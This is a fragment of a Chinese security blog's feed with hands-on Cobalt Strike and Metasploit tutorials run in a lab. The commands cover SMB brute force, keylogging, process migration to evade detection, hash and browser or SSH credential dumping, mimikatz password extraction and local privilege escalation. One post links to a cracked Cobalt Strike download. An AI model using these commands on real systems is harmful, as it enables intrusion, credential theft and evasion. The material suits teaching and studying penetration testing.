        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike安装</title>
    <url>/2019/11/13/cs%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>Cobalt Strike 是一款美国Red Team开发的渗透测试神器，常被业界人简称为CS。其拥有多种协议主机上线 方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz 等其他知名工具，因此广受黑客喜爱。 </p><a id="more"></a>
<p><img src="//choge.top/2019/11/13/cs安装/cs-5.png" alt="cs-5"></p>
<p>官网：<a href="https://www.cobaltstrike.com" target="_blank" rel="noopener">https://www.cobaltstrike.com</a> </p>
<h2 id="Cobalt-Strike框架"><a href="#Cobalt-Strike框架" class="headerlink" title="Cobalt Strike框架"></a>Cobalt Strike框架</h2><h3 id="Scripts-用户安装的插件"><a href="#Scripts-用户安装的插件" class="headerlink" title="Scripts 用户安装的插件"></a>Scripts 用户安装的插件</h3><ul>
<li>Log 每天的日志</li>
<li>c2lint 检查profile的错误异常</li>
<li>cobaltstrike</li>
<li>cobaltstrike.jar 客户端程序</li>
<li>icon.jpg LOGO</li>
<li>license.pdf 许可证文件</li>
<li>readme.txt</li>
<li>releasenotes.txt</li>
<li>teamserver 服务端程序</li>
<li>update</li>
<li>update.jar 更新程序</li>
<li>third-party 第三方工具，里面放的vnc dll </li>
</ul>
<h2 id="高扩展"><a href="#高扩展" class="headerlink" title="高扩展"></a>高扩展</h2><ol>
<li>Cobalt Strike可以使用 AggressorScripts脚本来加强自身，使其更加丰满，能够扩展菜单栏，视图Beacon命令 行，提权脚本等 </li>
<li>Cobalt Strike通信配置文件是 Malleable C2你可以修改CS的通讯特征，Beaconpayload的一些行为 </li>
<li>Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Co balt St rike提出的一套规范/框架，它允许黑客根据需要对框架提供的默认HTTP(S)/DNS/SMB C2通信通道进行扩展。 </li>
</ol>
<h2 id="Cobalt-strike-启动"><a href="#Cobalt-strike-启动" class="headerlink" title="Cobalt strike 启动"></a>Cobalt strike 启动</h2><p>VPS安装Java环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">wget https://repo.huaweicloud.com/java/jdk/8u171-b11/jdk-8u171-linux-x64.tar.gz </span><br><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/lib/</span><br><span class="line">echo "export JAVA_HOME=/usr/lib/jdk1.8.0_171/" &gt;&gt; /etc/profile</span><br><span class="line">echo "export JRE_HOME=/usr/lib/jdk1.8.0_171/jre" &gt;&gt; /etc/profile</span><br><span class="line">echo "export PATH=\$JAVA_HOME/bin:\$JAVA_HOME/jre/bin:\$PATH" &gt;&gt; /etc/profile</span><br><span class="line">echo "export CLASSPATH=\$CLASSPATH:.:\$JAVA_HOME/lib:\$JAVA_HOME/jre/lib" &gt;&gt; /etc/profile</span><br><span class="line">`source /etc/profile`</span><br><span class="line">rm jdk-8u171-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<p>将上述代码保存为install.sh，<code>chmod +x install.sh</code>后<code>./install.sh</code>执行，执行完毕在执行一次<code>source /etc/profile</code>后输入<code>java</code>,有返回即为java环境安装成功</p>
<p>Cobalt Strike3.14破解版下载与破解方法参链接：</p>
<p><a href="https://www.cnblogs.com/ssooking/p/11045530.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/11045530.html</a></p>
<p>将cs传入到vps的opt文件夹下</p>
<p><img src="//choge.top/2019/11/13/cs安装/cs-2.png" alt="cs-2"></p>
<p><code>chmod +x teamserver</code>    赋予teamserver执行权限</p>
<p><img src="//choge.top/2019/11/13/cs安装/cs-3.png" alt="cs-3"></p>
<p><code>vim teamserver</code>可修改teamserver端口，默认端口为50050</p>
<p><img src="//choge.top/2019/11/13/cs安装/cs-4.png" alt="cs-4"></p>
<p>后台运行teamserver</p>
<p><code>nohup ./teamserver VPS_IP password &gt;/dev/null 2&gt;&amp;1 &amp;</code></p>
<p>客户端（macOS）执行<code>./cobaltstrike</code>进行连接teamserver</p>
<p><img src="//choge.top/2019/11/13/cs安装/cs-6.png" alt="cs-6"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之反向Socks5代理</title>
    <url>/2019/11/10/msf%E4%B9%8BSocks5%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>本文主要介绍msf的Socks5代理</p><h2 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h2><p>采用socks协议的<a href="https://baike.baidu.com/item/代理服务器/97996" target="_blank" rel="noopener">代理服务器</a>就是SOCKS服务器，是一种通用的代理服务器。Socks是个电路级的底层<a href="https://baike.baidu.com/item/网关/98992" target="_blank" rel="noopener">网关</a>，是DavidKoblas在1990年开发的，此后就一直作为Internet RFC标准的开放标准。Socks 不要求应用程序遵循特定的操作系统平台，Socks 代理与<a href="https://baike.baidu.com/item/应用层/4329788" target="_blank" rel="noopener">应用层</a>代理、 HTTP 层代理不同，Socks 代理只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。所以，<a href="https://baike.baidu.com/item/Socks代理" target="_blank" rel="noopener">Socks代理</a>比其他应用层代理要快得多。</p><a id="more"></a>

<h2 id="不支持的协议"><a href="#不支持的协议" class="headerlink" title="不支持的协议"></a>不支持的协议</h2><p>不支持ping、arp命令</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>目标内网含有多台机器，网速较好，想要便捷访问目标任意服务</p>
<h2 id="msf操作"><a href="#msf操作" class="headerlink" title="msf操作"></a>msf操作</h2><p>拓扑图如下<img src="//choge.top/2019/11/10/msf之Socks5代理/msf-6.png" alt="msf-6"></p>
<p><code>run autoroute -s ip段</code>添加路由表</p>
<p><img src="//choge.top/2019/11/10/msf之Socks5代理/msf-1.png" alt="msf-1"></p>
<p><code>search socks</code>搜索可以利用的socks代理</p>
<p><img src="//choge.top/2019/11/10/msf之Socks5代理/msf-2.png" alt="msf-2"></p>
<p>使用socks5代理，并设置配置选项</p>
<p><img src="//choge.top/2019/11/10/msf之Socks5代理/msf-3.png" alt="msf-3"></p>
<p>srvhost设置为0.0.0.0 则任意用户都能使用此socks服务，设置127.0.0.1只有本机可使用此服务</p>
<p>设置代理端口（缺图）</p>
<p>修改proxychains代理端口与设置端口一致</p>
<p><code>vim /etc/proxychains.conf</code></p>
<p><img src="//choge.top/2019/11/10/msf之Socks5代理/msf-4.png" alt="msf-4"></p>
<p>代理测试并未成功，后续再修改</p>
<h2 id="2020-1-23补充测试"><a href="#2020-1-23补充测试" class="headerlink" title="2020/1/23补充测试"></a>2020/1/23补充测试</h2><p>由于之前测试未成功，多次尝试发现msf应选择socks4a代理，proxychains配置文件应选择socks4可以成功执行。</p>
<p>选择socks4a代理如下</p>
<p><img src="//choge.top/2019/11/10/msf之Socks5代理/msf-7.png" alt="msf-7"></p>
<p>配置文件填写如下</p>
<p><img src="//choge.top/2019/11/10/msf之Socks5代理/msf-8.png" alt="msf-8"></p>
<p>使用nmap探测端口成功，ip地址172.16.237.159对应拓扑图中的172.16.237.154</p>
<p><img src="//choge.top/2019/11/10/msf之Socks5代理/msf-9.png" alt="msf-9"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>socks5</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之端口转发</title>
    <url>/2019/11/10/msf%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<p>本文主要介绍msf获取meterpreter后进行端口转发</p><h2 id="端口转发简单释义"><a href="#端口转发简单释义" class="headerlink" title="端口转发简单释义"></a>端口转发简单释义</h2><p>端口转发（Port forwarding），有时候叫隧道，是安全壳（SSH）为网络安全通信使用的一种方法。端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为，其使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。外文名：Port forwarding</p><a id="more"></a>

<p><a href="https://en.wikipedia.org/wiki/Port_forwarding" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Port_forwarding</a></p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>一般都是应用在无法直接使用某个端口的情况下。</p>
<h2 id="msf操作"><a href="#msf操作" class="headerlink" title="msf操作"></a>msf操作</h2><p>拓扑图如下</p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-1.png" alt="msf-1"></p>
<p><code>portfwd -h</code>查看端口转发用法</p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-2.png" alt="msf-2"></p>
<p><code>portfwd add -l 本地监听端口 -p 远程需转发端口 -r 远程主机ip</code></p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-3.png" alt="msf-3"></p>
<p>本地机执行<code>redesktop 127.0.0.1:本地监听端口</code></p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-5.png" alt="msf-5"></p>
<p>输入账号密码后进入远程桌面</p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-6.png" alt="msf-6"></p>
<p>对拓扑图中Database主机进行端口转发</p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-7.png" alt="msf-7"></p>
<p>启动远程桌面连接</p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-8.png" alt="msf-8"></p>
<p>输入账号密码后成功进入远程桌面</p>
<p><img src="//choge.top/2019/11/10/msf之端口转发/msf-9.png" alt="msf-9"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>port forwarding</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之添加路由、端口扫描、smb爆破和命令执行</title>
    <url>/2019/11/08/msf%E4%B9%8B%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<p>本文主要介绍msf在获取一个meterpreter后，通过添加路由和端口扫描进一步对内网进行探测</p><h2 id="获取网段"><a href="#获取网段" class="headerlink" title="获取网段"></a>获取网段</h2><p><code>shell</code>命令之后使用<code>ipconfig</code>查看</p><p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-1.png" alt="msf-1"></p><p><code>run get_local_subnets</code>查看</p><p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-2.png" alt="msf-2"></p><p><code>route list</code>查看</p><p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-3.png" alt="msf-3"></p><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><p><code>route add</code>手工添加</p><p><code>background</code>使meterpreter返回到后台，<code>route -h</code>查看帮助</p><a id="more"></a>








<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-4.png" alt="msf-4"></p>
<p>添加路由格式为<code>route add ip段地址 子网掩码 sessions_id</code></p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-5.png" alt="msf-5"></p>
<p>删除路由格式为<code>route del ip段地址 子网掩码 sessions_id</code></p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-6.png" alt="msf-6"></p>
<p>其他格式添加方法</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-7.png" alt="msf-7"></p>
<p><code>run autoroute</code>自动添加路由</p>
<p>在meterpreter下<code>run autoroute -h</code>查看帮助，<code>run autoroute -s ip段</code>添加路由，<code>run autoroute -p</code>打印路由</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-8.png" alt="msf-8"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>arp扫描，一般不在内网中进行arp扫描，容易被安全设备发掘</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-9.png" alt="msf-9"></p>
<p>端口扫描<code>search portscan</code>搜索可扫描利用模块</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-10.png" alt="msf-10"></p>
<p><code>use 5</code>选择tcp扫描，查看配置信息</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-11.png" alt="msf-11"></p>
<p>设置网段端口和线程</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-12.png" alt="msf-12"></p>
<p>扫描结果如下</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-13.png" alt="msf-13"></p>
<h2 id="smb爆破和命令执行"><a href="#smb爆破和命令执行" class="headerlink" title="smb爆破和命令执行"></a>smb爆破和命令执行</h2><h3 id="smb爆破"><a href="#smb爆破" class="headerlink" title="smb爆破"></a>smb爆破</h3><p><code>use auxiliary/scanner/smb/smb_login</code></p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-14.png" alt="msf-14"></p>
<p>设置相关参数</p>
<p><code>set smbuser administrator</code>为设置smb用户为administrator</p>
<p><code>set smbpass 123.com</code>为设置smb密码为123.com</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-15.png" alt="msf-15"></p>
<p>高级用法</p>
<p><code>set user_file 用户路径</code>为设置多用户</p>
<p><code>set userpass_file 用户路径</code>为设置多密码</p>
<p><code>set user_as_pass</code>为设置用户信息也作为密码</p>
<p><code>set rhosts 文件路径(file:/root/host.dic)</code>为设置多ip</p>
<p>###命令执行</p>
<p><code>search psexec</code>搜索命令执行可利用模块</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-16.png" alt="msf-16"></p>
<p>使用如下模块</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-17.png" alt="msf-17"></p>
<p>模块配置并执行，执行命令为<code>whoami</code></p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-19.png" alt="msf-19"></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>提供拓扑图，比较添加路由前后扫描结果对比</p>
<p>拓扑图如下</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-21.png" alt="msf-21"></p>
<p>如上拓扑图情况下，未添加路由和添加路由后445端口扫描情况对比</p>
<p><img src="//choge.top/2019/11/08/msf之添加路由、端口扫描/msf-22.png" alt="msf-22"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>route</tag>
        <tag>smb</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之键盘记录、屏幕截图、文件操作、load扩展</title>
    <url>/2019/11/08/msf%E4%B9%8B%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E3%80%81%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E3%80%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E3%80%81load%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<p>本文主要介绍msf的键盘记录、屏幕截图、文件操作和load扩展等常规操作</p><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p>获取一个meterpreter后<code>help</code>查看可使用命令</p><p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-1.png" alt="msf-1"></p><p>键盘记录相关命令如下</p><p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-2.png" alt="msf-2"></p><p><code>keyscan_start</code>开始监听，然后在目标机输入信息，<code>keyscan_dump</code>进行查看，其中&lt;^C&gt;代表ctrl+c</p><p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-3.png" alt></p><p><code>keyboard_send</code>为进行发送</p><a id="more"></a>







<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-4.png" alt="msf-4"></p>
<p>已向目标机发送aaaaaa信息</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-5.png" alt="msf-5"></p>
<h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><p><code>screenshot</code>进行屏幕截图</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-6.png" alt="msf-6"></p>
<p>截图如下</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-24.jpeg" alt="msf-24"></p>
<p>切换为administrator用户登录后，当前用户为administrator，<code>screenshot</code>截屏为administrator桌面</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-25.jpeg" alt="msf-25"></p>
<p>当前用户为将C0cho，并将其meterpreter迁移到administrator的explorer.exe中 截屏为当前用户C0cho桌面</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-26.jpeg" alt="msf-26"></p>
<p>当前用户为将C0cho，并将其meterpreter迁移到system的进程中，截屏为当前用户C0cho桌面</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-27.jpeg" alt="msf-27"></p>
<p>administrator用户下获取meterpreter截屏，截屏为C0cho桌面，因为当前用户为C0cho</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-28.jpeg" alt="msf-28"></p>
<p>总结：无论获取哪个用户的meterpreter，截屏只截取当前所在用户桌面，session穿透截屏不在本文讨论范围</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p><code>lls</code>查看msf攻击机本地文件</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-8.png" alt="msf-8"></p>
<p><code>lpwd</code>查看msf攻击机路径</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-9.png" alt="msf-9"></p>
<p>上传图片到目标机其中目标机使用路径使用斜杠如c:/，如果使用反斜杠要使用两次，防止被转义如c:\</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-10.png" alt="msf-10"></p>
<p>文件下载如下</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-11.png" alt="msf-11"></p>
<h2 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h2><p>查看文件</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-12.png" alt="msf-12"></p>
<p>编辑文件，一般不建议在目标机里编辑文件，避免出错，一般为下载到本地进行编辑</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-13.png" alt="msf-13"></p>
<p><code>getwd</code>查看目标机当前路径</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-14.png" alt="msf-14"></p>
<p>切换目标机磁盘路径</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-15.png" alt="msf-15"></p>
<h2 id="查看用户登录情况"><a href="#查看用户登录情况" class="headerlink" title="查看用户登录情况"></a>查看用户登录情况</h2><p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-16.png" alt="msf-16"></p>
<h2 id="load扩展"><a href="#load扩展" class="headerlink" title="load扩展"></a>load扩展</h2><p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-17.png" alt="msf-17"></p>
<p>加载python脚本</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-18.png" alt="msf-18"></p>
<p>查看使用命令</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-19.png" alt="msf-19"></p>
<p>执行python命令，也可以直接价值python脚本进行使用</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-20.png" alt="msf-20"></p>
<p>参考：<a href="http://offensive-security.com/metasploit-unleashed/python-ext-examples/" target="_blank" rel="noopener">offensive-security.com/metasploit-unleashed/python-ext-examples/</a></p>
<p>加载powershell</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-21.png" alt="msf-21"></p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-22.png" alt="msf-22"></p>
<p>执行poweshell命令</p>
<p><img src="//choge.top/2019/11/08/msf之键盘记录、屏幕截图、文件操作、load扩展/msf-23.png" alt="msf-23"></p>
<p>其他load扩展可参考官方文档</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>load</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之meterpreter进程迁移</title>
    <url>/2019/10/30/msf%E4%B9%8Bmeterpreter%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>正常使用exe上线的情况下，会在任务管理器或者直接使用<code>tasklist</code>命令就都可以看到exe的进程，十分容易被发现，因此要把进程迁移到其他原有的进程上面，相当于寄生在别的进程上面</p><h2 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h2><p>普通权限手动迁移</p><p>获取一个meterpreter后<code>ps</code>查看进程信息</p><p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-1.png" alt="msf-1"></p><p><code>getpid</code>查看当前进程信息，pid编号为1936，对应进程为shell64.exe</p><a id="more"></a>




<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-2.png" alt="msf-2"></p>
<p><code>migrate -N 进程名</code>，如下图操作迁移到explorer.exe进程</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-3.png" alt="msf-3"></p>
<p>迁移成功后<code>getpid</code>查看进程编号为3068，对应进程为explorer.exe</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-4.png" alt="msf-4"></p>
<p>由于此sessiosn未提权和绕过uac，<code>hashdump</code>失败</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-6.png" alt="msf-6"></p>
<p>手动迁移进程也可以使用<code>migrate -P 进程pid编号</code>进行迁移</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-5.png" alt="msf-5"></p>
<p>高权限手动迁移</p>
<p>获取一个高权限session后进行手动迁移，迁移方法同上，迁移后可使用<code>hashdump</code></p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-7.png" alt="msf-7"></p>
<h2 id="自动迁移"><a href="#自动迁移" class="headerlink" title="自动迁移"></a>自动迁移</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set autorunscript migrate -n explorer.exe</span><br><span class="line">set AutoRunscript migrate -f</span><br></pre></td></tr></table></figure>

<p>使用低权限session通过<code>set autorunscript migrate -n explorer.exe</code>进行指定进程迁移，迁移成功但<code>hashdump</code>失败</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-8.png" alt="msf-8"></p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-9.png" alt="msf-9"></p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-10.png" alt="msf-10"></p>
<p>使用高低权限session通过<code>set AutoRunscript migrate -f</code>进行自动迁移</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-11.png" alt="msf-11"></p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-12.png" alt="msf-12"></p>
<p>查看<code>pid</code>信息</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-13.png" alt="msf-13"></p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-14.png" alt="msf-14"></p>
<p>查看目标机进程信息，未发现notepad.exe进程，已自动隐藏</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-15.png" alt="msf-15"></p>
<p><code>show advanced</code>可查看其他高级用法</p>
<p><img src="//choge.top/2019/10/30/msf之meterpreter进程迁移/msf-16.png" alt="msf-16"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>process</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之post模块详解</title>
    <url>/2019/10/30/msf%E4%B9%8Bpost%E6%A8%A1%E5%9D%97%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/</url>
    <content><![CDATA[<p>本文主要介绍msf的post模块</p>
<p><code>search post</code>可以搜索post模块payload</p>
<p><img src="//choge.top/2019/10/30/msf之post模块实战演练/msf-1.png" alt="msf-1"></p>
<p>部分psot模块payload如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/hashdump  #system权限下可获取hash</span><br><span class="line">run post/windows/gather/smart_hashdump  </span><br><span class="line">run post/multi/recon/local_exploit_suggester  #获取补丁信息，提供可提权的exploit</span><br><span class="line">run post/multi/gather/firefox_creds  #获取火狐凭证</span><br><span class="line">run post/multi/gather/ssh_creds  #获取ssh凭证</span><br><span class="line">run post/windows/gather/enum_applications  #目标安装的软件</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>post</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之获系统取明文密码</title>
    <url>/2019/10/30/msf%E4%B9%8B%E8%8E%B7%E7%B3%BB%E7%BB%9F%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>本文主要针对windos系统获取高权限shell后利用msf获取明文密码</p>
<h2 id="mimikatz获取明文密码"><a href="#mimikatz获取明文密码" class="headerlink" title="mimikatz获取明文密码"></a>mimikatz获取明文密码</h2><p><code>load mimikatz</code>加载mimikatz</p>
<p><img src="//choge.top/2019/10/30/msf之获系统取明文密码/msf-1.png" alt="msf-1"></p>
<p><code>wdigest</code>获取明文密码，如下图密码为空</p>
<p><img src="//choge.top/2019/10/30/msf之获系统取明文密码/msf-2.png" alt="msf-2"></p>
<p><code>kerberos</code>获取明文密码</p>
<p><img src="//choge.top/2019/10/30/msf之获系统取明文密码/msf-3.png" alt="msf-3"></p>
<p><code>msv</code>获取明文密码</p>
<p><img src="//choge.top/2019/10/30/msf之获系统取明文密码/msf-4.png" alt="msf-4"></p>
<p>注意：一般开机登陆过后可利用mimikatz获取明文密码，注销情况下也可以获取，但重启后未登陆情况下无法获取</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msf</tag>
        <tag>password</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之windows提权流程</title>
    <url>/2019/10/30/msf%E4%B9%8Bwindows%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>本文主要介绍msf下对windows操作系统的一般操作流程</p><h2 id="priv提权"><a href="#priv提权" class="headerlink" title="priv提权"></a>priv提权</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load priv</span><br><span class="line">use priv</span><br><span class="line">getsystem</span><br></pre></td></tr></table></figure><p>如下图，提权失败</p><p><img src="//choge.top/2019/10/30/msf之windows提权/msf-1.png" alt="msf-1"></p><h2 id="uac绕过"><a href="#uac绕过" class="headerlink" title="uac绕过"></a>uac绕过</h2><p>详见本博文章-Metasploit之windows提权_uac绕过</p><p><img src="//choge.top/2019/10/30/msf之windows提权/msf-2.png" alt="msf-2"></p><h2 id="后渗透模块提权"><a href="#后渗透模块提权" class="headerlink" title="后渗透模块提权"></a>后渗透模块提权</h2><p>可参考本博文章-Metasploit之post模块详解，利用<code>run post/multi/recon/local_exploit_suggester</code>提供提权paylaod</p><a id="more"></a>







<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-3.png" alt="msf-3"></p>
<p>运行后提供的提权建议如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exploit/windows/local/ms10_092_schelevator</span><br><span class="line">exploit/windows/local/ms16_014_wmi_recv_notif</span><br></pre></td></tr></table></figure>

<p>一般从新到旧进行漏洞利用</p>
<p>利用<code>exploit/windows/local/ms10_092_schelevator</code>进行提权</p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-4.png" alt="msf-4"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-5.png" alt="msf-5"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-5-1.png" alt="msf-5-1"></p>
<p>exploit后可利用成功（缺图）</p>
<p>利用<code>exploit/windows/local/ms16_014_wmi_recv_notif</code>进行提权</p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-6.png" alt="msf-6"></p>
<p><img src="//choge.top/2019/10/30/msf之windows提权/msf-6-1.png" alt="msf-6-1"></p>
<p>上图所示target为windows7，但是目标机为windows 2008 R2 x64，因为已给了建议漏洞利用payload，还是需要尝试一下，如下图所示，漏洞利用成功获取shell</p>
